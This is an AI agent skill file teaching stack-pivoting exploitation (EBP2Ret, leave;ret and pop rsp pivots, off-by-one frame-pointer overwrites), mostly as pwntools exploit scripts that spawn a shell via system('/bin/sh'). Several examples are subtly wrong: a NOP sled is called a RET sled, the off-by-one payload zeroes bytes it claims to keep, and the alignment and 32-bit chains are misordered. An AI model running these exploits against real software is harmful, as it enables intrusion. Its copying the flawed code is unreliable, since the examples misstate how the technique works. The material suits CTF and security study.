---
name: stack-pivoting-exploitation
description: How to exploit stack pivoting vulnerabilities using EBP2Ret, EBP chaining, and other pivot gadgets. Use this skill whenever the user mentions stack pivoting, EBP/RBP manipulation, leave;ret gadgets, pop rsp gadgets, xchg gadgets, or needs to control RSP/ESP in binary exploitation. Also use when dealing with off-by-one vulnerabilities that can modify saved frame pointers, or when standard ROP isn't available but you can control the frame pointer. Make sure to use this skill for any binary exploitation task involving stack pointer manipulation, function epilogue exploitation, or when you need to redirect execution flow through the frame pointer.
---

# Stack Pivoting Exploitation

This skill helps you exploit stack pivoting vulnerabilities by manipulating the Base Pointer (EBP/RBP) to control execution flow through function epilogues.

## When to Use This Skill

Use this skill when:
- You can control the saved EBP/RBP but not EIP/RIP directly
- You have an off-by-one vulnerability affecting the frame pointer
- You need to pivot the stack pointer to attacker-controlled memory
- Standard ROP chains aren't available but pivot gadgets exist
- You're working with function epilogues containing `leave; ret` or similar
- You need to chain multiple function calls through fake frame pointers

## Core Concepts

### The `leave; ret` Pattern

On x86/x86-64, `leave` is equivalent to:
```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```

The saved EBP/RBP sits on the stack before the saved EIP/RIP. By controlling EBP, you can indirectly control where RSP points after `leave`, and thus control the return address.

### Key Insight

You need to know **two addresses**:
1. Where RSP will point after `leave` (your controlled memory location)
2. The value at that location that `ret` will consume (your target address)

## Finding Pivot Gadgets

### Using Ropper

```bash
# Find leave;ret gadgets
ropper --file ./vuln --search "leave; ret"

# Find pop rsp gadgets
ropper --file ./vuln --search "pop rsp"

# Find xchg gadgets
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# Find add rsp gadgets
ropper --file ./vuln --search "add rsp,"
```

### Using ROPgadget

```bash
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```

### Common Pivot Gadgets to Search For

- `leave ; ret` - Classic frame pointer pivot
- `pop rsp ; ret` - Direct stack pointer control
- `xchg rax, rsp ; ret` - Swap register with stack pointer
- `add rsp, <imm> ; ret` - Increment stack pointer
- `mov rsp, <reg> ; ret` - Move register to stack pointer

## EBP2Ret Technique

### When It Works

- You can write to the saved EBP/RBP location
- The function uses frame pointers (not optimized away)
- You have a writable memory region to stage your payload

### Exploit Construction Steps

1. **Find a writable address** where you can place your payload
2. **Craft the fake EBP** to point to your writable region + offset (8 bytes on x86-64, 4 bytes on x86 for the `pop rbp`)
3. **Stage your payload** at the writable address:
   - First 8/4 bytes: junk or second fake EBP (consumed by `pop rbp`)
   - Next 8/4 bytes: your target address (consumed by `ret`)
4. **Overflow to overwrite saved EBP** with your fake EBP
5. **When function returns**, `leave` sets RSP to your fake EBP, `pop rbp` consumes the first value, `ret` jumps to your target

### Payload Structure (x86-64)

```
[Writable Memory Location]
├── 0x00-0x07: Junk or second fake EBP (pop rbp)
├── 0x08-0x0F: Target address (ret)
└── 0x10+: Additional ROP chain or arguments
```

### Example: Calling system("/bin/sh")

```python
from pwn import *

elf = context.binary = ELF('./vuln')
context.arch = 'amd64'

# Find addresses
SYSTEM = elf.sym['system']
BINSH = next(elf.search(b'/bin/sh'))
LEAVE_RET = 0x40117c  # Found via ropper

# Writable region (e.g., .bss or heap)
WRITABLE_ADDR = 0x601000

# Craft payload at writable address
payload_at_writable = flat(
    0x0,                    # pop rbp (junk or second fake EBP)
    SYSTEM,                 # ret target
    0x0,                    # return after system
    BINSH                   # argument for system
)

# Main overflow payload
payload = b'A' * offset_to_saved_rbp  # Pad to saved RBP
payload += flat(
    WRITABLE_ADDR + 0x8,    # Fake RBP (pointing past the pop rbp value)
    LEAVE_RET               # This will be the return address
)

# Send payload
p.sendline(payload)
```

## EBP Chaining

### Concept

Chain multiple fake EBPs to control execution flow through multiple function calls:

```
[Controlled Memory]
├── Fake EBP 1
├── &system()
├── &leave;ret
├── &"/bin/sh"
├── Fake EBP 2
├── &exit()
└── ...
```

### When to Use

- You need to call multiple functions in sequence
- You have limited write primitives
- You want to maintain control after each function returns

### Example with Stack Leak

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

# Get stack leak
p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

# Gadgets
LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

# ROP chain
payload = flat(
    0x0,               # rbp (could be another fake RBP)
    POP_RDI,
    0xdeadbeef,
    POP_RSI_R15,
    0xdeadc0de,
    0x0,
    elf.sym['winner']
)

# Pad to reach saved RBP
payload = payload.ljust(96, b'A')

# Add the pivot
payload += flat(
    buffer,         # Load leaked address in RBP
    LEAVE_RET       # Use leave to pivot RSP
)

p.sendline(payload)
```

## Off-By-One Variant

### When It Applies

- You can only modify the **least significant byte** of saved EBP/RBP
- The target memory location shares the first 3/5 bytes with original EBP/RBP

### Strategy

1. Find a writable region near the original EBP (same page or nearby aligned region)
2. Use a **RET sled** to increase hit probability
3. Place the real ROP chain at the end of the sled
4. Modify the low byte to jump into the sled

### Example

```python
# Original EBP: 0x7fffffffe000
# We can only change the last byte
# Target: 0x7fffffffe0FF (same page, different offset)

# Create RET sled
RET_SLED = b'\x90' * 256  # NOP sled
ROP_CHAIN = flat(SYSTEM, 0, BINSH)

# Place at target address
payload_at_target = RET_SLED + ROP_CHAIN

# Overflow to modify last byte of EBP
payload = b'A' * offset_to_saved_rbp
payload += b'\x00' * 7  # Keep first 7 bytes
payload += b'\xff'      # Change last byte to 0xFF
```

## Alternative Pivot Gadgets

### pop rsp Gadget

```python
# Gadget: pop rsp; pop r13; pop r14; pop r15; ret
POP_CHAIN = 0x401225

payload = flat(
    0,                 # r13
    0,                 # r14
    0,                 # r15
    POP_RDI,
    0xdeadbeef,
    POP_RSI_R15,
    0xdeadc0de,
    0x0,
    elf.sym['winner']
)

payload = payload.ljust(104, b'A')

# Pivot RSP
payload += flat(
    POP_CHAIN,
    buffer             # New RSP value
)
```

### xchg <reg>, rsp Gadget

```
[Stack Layout]
├── Return address (to xchg gadget)
├── Register value (where RSP should point)
└── [Register value] <- RSP will point here after xchg
```

```python
XCHG_RAX_RSP = 0x401230

payload = flat(
    XCHG_RAX_RSP,
    WRITABLE_ADDR      # Value to move into RSP via RAX
)
```

## Architecture-Specific Considerations

### x86-64 (amd64)

- **16-byte stack alignment** required before `call` instructions
- Add alignment gadget if needed: `ret` or `sub rsp, 8; ret`
- Use `pop rdi` for first argument, `pop rsi` for second, etc.

```python
# Alignment before calling system
payload = flat(
    POP_RDI,
    BINSH,
    0x0,               # Alignment (8 bytes)
    SYSTEM
)
```

### x86 (32-bit)

- Arguments passed on stack (right-to-left)
- No 16-byte alignment requirement
- Use `push` gadgets or direct stack layout

```python
# x86 system("/bin/sh")
payload = flat(
    BINSH,             # Push argument
    SYSTEM             # Call system
)
```

### ARM64

ARM64 works differently:
- `RET` returns to `x30`, not SP
- Prologue/epilogue don't store/retrieve SP from stack
- Need to control both SP and x30

```
Prologue:
  sub sp, sp, 16
  stp x29, x30, [sp]   # [sp] = x29; [sp+8] = x30
  mov x29, sp

Epilogue:
  ldp x29, x30, [sp]   # x29 = [sp]; x30 = [sp+8]
  add sp, sp, 16
  ret                   # Returns to x30
```

**ARM64 Strategy:**
1. Control SP through some other means (overflow, register leak)
2. Abuse epilogue to load x30 from controlled SP
3. RET to the controlled x30 value

## Modern Mitigations

### CET Shadow Stack (SHSTK)

**Problem:** CET compares return addresses on normal stack with hardware-protected shadow stack. Mismatch = crash.

**Impact:** EBP2Ret and `leave;ret` pivots will crash on first `ret` from pivoted stack.

### Checking for CET/SHSTK

```bash
# Check if binary is CET-marked
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# Check CPU support
grep -E 'user_shstk|ibt' /proc/cpuinfo

# Check if active for process
grep -E 'x86_Thread_features' /proc/$$/status

# In gdb/pwndbg
(gdb) checksec
```

### Workarounds (if SHSTK is present)

- JOP (Jump-Oriented Programming)
- COOP (Call-Oriented Oriented Programming)
- SROP (Sigreturn-Oriented Programming)
- Avoid `ret`-based pivots entirely

### Windows CET

- Windows 10+: User-mode CET
- Windows 11+: Kernel-mode Hardware-enforced Stack Protection
- Developers opt-in via CETCOMPAT
- Same impact: `ret`-based pivots fail

## Frame Pointer Omission

### Problem

Optimized binaries may omit frame pointers:

```
# With frame pointer:
push   %ebp
mov    %esp,%ebp
...
leave
ret

# Without frame pointer (optimized):
push   %ebx
sub    $0x100,%esp
...
add    $0x10c,%esp
pop    %ebx
ret
```

### Detection

```bash
# Check compilation flags
readelf -p .comment ./binary

# Disassemble function
objdump -d ./binary | grep -A 20 '<function_name>'

# Look for leave;ret or pop rbp;ret
```

### If Frame Pointer is Omitted

- EBP2Ret won't work
- Look for alternative pivot gadgets:
  - `pop rsp; ret`
  - `xchg rax, rsp; ret`
  - `add rsp, <imm>; ret`

## Classic Pivot Staging Pattern

A robust strategy for many CTFs/exploits:

1. **Initial overflow** → Call `read`/`recv` into large writable region
2. **Stage full ROP chain** in `.bss`, heap, or mapped RW memory
3. **Return to pivot gadget** → Move RSP to staged region
4. **Continue with chain** → Leak libc, call `mprotect`, read shellcode, jump

```python
# Step 1: Overflow to call read into .bss
payload1 = b'A' * offset + flat(
    POP_RDI,
    BSS_ADDR,
    POP_RSI,
    0x100,
    READ_ADDR
)

# Step 2: Send ROP chain to .bss
rop_chain = flat(
    POP_RDI,
    BINSH,
    SYSTEM
)

# Step 3: Pivot to .bss
payload2 = b'B' * offset + flat(
    LEAVE_RET,
    BSS_ADDR + 0x8  # Account for pop rbp
)
```

## Debugging Tips

### In GDB/Pwndbg

```gdb
# Set breakpoint at vulnerable function
break *0x401234

# Examine stack
x/20gx $rsp

# Check frame pointer
info frame

# After overflow, check saved RBP
x/10gx $rbp

# Single step through epilogue
stepi

# Watch RSP changes
display/1gx $rsp
```

### Common Issues

1. **Wrong offset** → Check with cyclic pattern
2. **Alignment issues** → Add padding before `call`
3. **Frame pointer omitted** → Use alternative gadgets
4. **CET enabled** → Pivot won't work, try SROP/JOP
5. **Wrong architecture** → Adjust for x86 vs x86-64 vs ARM64

## Quick Reference

| Gadget | Use Case | Stack Layout |
|--------|----------|-------------|
| `leave; ret` | Classic EBP pivot | [fake EBP][target addr] |
| `pop rsp; ret` | Direct RSP control | [new RSP value] |
| `xchg rax, rsp; ret` | Swap register with RSP | [rax value] |
| `add rsp, 8; ret` | Increment RSP | - |
| `mov rsp, rdi; ret` | Move register to RSP | - |

## Next Steps

After successful pivot:
1. **Leak addresses** if PIE is enabled
2. **Call mprotect** to make memory executable
3. **Read shellcode** into executable memory
4. **Jump to shellcode** or continue ROP chain
5. **Maintain alignment** throughout the chain

## References

- [HackTricks Stack Pivoting](https://hacktricks.xyz/windows-primitive-abuse/stack-pivoting)
- [ir0nstone Stack Pivoting Notes](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [Bananamafia Stack Pivot Tutorial](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [Linux Kernel CET Documentation](https://www.kernel.org/doc/html/next/x86/shstk.html)
- [Microsoft CET Documentation](https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection)
